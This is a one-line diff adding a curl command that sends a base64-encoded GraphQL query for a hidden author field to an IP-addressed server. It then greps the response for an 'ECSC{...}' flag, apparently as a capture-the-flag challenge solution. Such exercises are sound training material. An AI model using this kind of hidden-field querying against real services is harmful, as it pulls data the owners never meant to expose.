@@ -1,0 +1,1 @@
+$ curl -s 'http://35.198.162.194:32724/query' --data-raw 'query=eyJxdWVyeSI6InthbGxQb3N0c3tlZGdlc3tub2Rle2F1dGhvcntyYW5kb21TdHIxbmd0b0luZHVjM1A0aW59fX19fSJ9' | jq '.data.allPosts.edges' | grep -E -o 'ECSC{.*}' | grep -v 'harder'
